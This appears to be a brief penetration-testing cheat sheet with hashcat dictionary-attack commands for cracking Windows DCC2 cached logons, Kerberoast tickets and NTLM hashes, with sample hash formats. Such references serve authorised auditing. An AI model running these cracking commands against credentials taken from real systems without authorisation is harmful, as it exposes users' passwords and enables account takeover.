


## Domain Logon Information (DCC2)


Format

```
$DCC2$#user#7eb833ab3baaade155de2bc642debdaa 
```

```
./hashcat-5.0.0/hashcat64.bin -a 0 -m 2100 -o result.txt -r ./hashcat-5.0.0/rules/dive.rule ./hashes.txt /usr/share/wordlists/rockyou.txt
```


## Kerberoast

Format:



```
./hashcat-5.0.0/hashcat64.bin -O -w 3 -a 0 -m 13100 -o result.txt -r ./hashcat-5.0.0/rules/dive.rule ./hashes.txt /usr/share/wordlists/rockyou.txt
```


## NTLM


Format:

```
edb2b435b51404dadad3a445c11404aa
```

```
./hashcat-5.0.0/hashcat64.bin -a 0 -m 1000 -o result.txt -r ./hashcat-5.0.0/rules/dive.rule ./hashes.txt /usr/share/wordlists/rockyou.txt
```